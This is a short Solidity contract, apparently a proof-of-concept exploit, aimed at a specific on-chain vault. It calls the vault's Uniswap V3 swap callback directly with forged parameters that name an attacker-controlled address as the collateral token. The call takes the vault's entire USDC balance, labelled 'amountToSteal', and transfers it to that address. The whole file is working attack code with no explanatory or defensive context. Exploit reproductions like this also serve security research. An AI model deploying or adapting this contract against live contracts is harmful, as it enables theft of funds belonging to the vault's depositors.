// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {IVault} from "./IVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Exploit {
    IVault internal constant victim = IVault(0xB91AE2c8365FD45030abA84a4666C4dB074E53E7);
    IERC20 internal constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function exploit(address exploitCoordinator) external {
        IVault.Reserves memory reserves = IVault.Reserves({reserveApes: 0, reserveLPers: 0, tickPriceX42: 0});

        IVault.VaultState memory vaultState = IVault.VaultState({reserve: 0, tickPriceSatX42: 0, vaultId: 0});

        IVault.VaultParameters memory vaultParams = IVault.VaultParameters({
            debtToken: address(usdc),
            collateralToken: exploitCoordinator, // The address of TokenA and exploitCoordinator
            leverageTier: 0
        });

        bytes memory data =
            abi.encode(msg.sender, exploitCoordinator, vaultParams, vaultState, reserves, false, true);

        uint256 amountToSteal = usdc.balanceOf(address(victim));

        victim.uniswapV3SwapCallback(0, int256(amountToSteal), data);

        uint256 usdcBalance = usdc.balanceOf(address(this));

        usdc.transfer(exploitCoordinator, usdcBalance);
    }
}
